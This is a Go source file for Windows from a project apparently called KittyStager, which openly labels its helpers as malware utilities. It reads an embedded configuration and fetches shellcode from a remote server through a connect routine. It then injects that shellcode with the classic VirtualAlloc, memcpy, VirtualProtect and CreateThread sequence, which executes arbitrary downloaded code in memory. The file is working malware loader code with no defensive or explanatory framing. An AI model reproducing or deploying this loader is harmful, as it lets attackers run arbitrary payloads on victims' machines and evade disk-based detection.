//go:build windows

package main

import (
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	_ "embed"
	"fmt"
	"golang.org/x/sys/windows"
)

//go:embed conf.txt
var t string

func main() {
	malConf, err := util.MalConfUnmarshalJSON([]byte(t))
	if err != nil {
		return
	}
	shellcode := malwareUtil.Connect(malConf)
	fmt.Println(shellcode)
	inject(shellcode)
}

func inject(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createThread := kernel32.NewProc("CreateThread")
	shellcodeExec, _ := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)

	malwareUtil.Memcpy(shellcodeExec, shellcode)

	var oldProtect uint32
	windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)

	hThread, _, _ := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
}
